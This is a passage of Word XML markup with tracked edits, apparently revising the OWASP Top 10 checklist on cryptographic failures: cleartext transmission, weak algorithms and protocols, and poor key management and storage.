    <w:p w14:paraId="317CA213" w14:textId="358874F0" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="648" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>and at rest. For example, passwords, credit card numbers, health</w:t>
      </w:r>
      <w:del w:id="649" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="15628FBE" w14:textId="4EFADDE0" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="650" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>records, personal information</w:t>
      </w:r>
      <w:ins w:id="651" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and business secrets require extra</w:t>
      </w:r>
      <w:del w:id="652" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="01312187" w14:textId="72F91916" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="653" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">protection, </w:t>
      </w:r>
      <w:del w:id="654" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>particularly</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="655" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>mainly</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> if that data falls under privacy laws, </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>e.g</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:del w:id="656" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="657" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>.,</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> EU's</w:t>
      </w:r>
      <w:del w:id="658" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="54DFDFAE" w14:textId="59445C66" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="659" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">General Data Protection Regulation (GDPR), or regulations, </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>e.g</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:del w:id="660" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">. </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="661" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>.,</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2B94F36D" w14:textId="54FD2E00" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>financial data protection such as PCI Data Security Standard (PCI DSS).</w:t>
      </w:r>
      <w:del w:id="662" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
      <w:moveFromRangeStart w:id="663" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923164"/>
      <w:moveFrom w:id="664" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>For all such data:</w:t>
        </w:r>
      </w:moveFrom>
      <w:moveFromRangeEnd w:id="663"/>
    </w:p>
    <w:p w14:paraId="0FDA8E7E" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="00841D1E" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="665" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveToRangeStart w:id="666" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923164"/>
      <w:moveTo w:id="667" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>For all such data:</w:t>
        </w:r>
      </w:moveTo>
      <w:moveToRangeEnd w:id="666"/>
    </w:p>
    <w:p w14:paraId="0C4B5A0B" w14:textId="4E993F1B" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="668" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="669" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="41CA0960" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="670" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7ED6763F" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="671" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="672" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Is any data transmitted in clear text? This concerns protocols such</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04834EF1" w14:textId="4CA95F26" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="673" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="674" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> as HTTP, SMTP, </w:t>
      </w:r>
      <w:del w:id="675" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">and </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>FTP</w:t>
      </w:r>
      <w:del w:id="676" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="677" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> also using TLS upgrades like STARTTLS.</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> External </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C78375D" w14:textId="50464EBB" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="678" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="679" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">internet traffic is </w:t>
      </w:r>
      <w:del w:id="680" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>especially dangerous.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="681" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>hazardous.</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Verify all internal traffic</w:t>
      </w:r>
      <w:ins w:id="682" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>e.g</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:del w:id="683" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="684" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">., </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6AF0AD05" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="685" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> between load balancers, web servers, or back-end systems.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E2A8889" w14:textId="34474176" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="686" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="687" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="30C4C304" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="688" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="689" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Are any old or weak cryptographic algorithms </w:t>
      </w:r>
      <w:ins w:id="690" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">or protocols </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">used either </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="077A42BA" w14:textId="2CA72A6E" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="691" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">by </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>default</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> or in older code?</w:t>
      </w:r>
      <w:del w:id="692" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="785E9DFA" w14:textId="24137A48" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="693" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="694" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="60DF79CD" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="695" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="696" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Are default crypto keys in use, weak crypto keys generated or</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7850A295" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="697" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> re-used, or is proper key management or rotation missing?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="487A2AA9" w14:textId="1A46D81A" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="698" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="699" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="700" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    Are crypto keys checked into source code repositories?</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="11C36B0A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="701" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
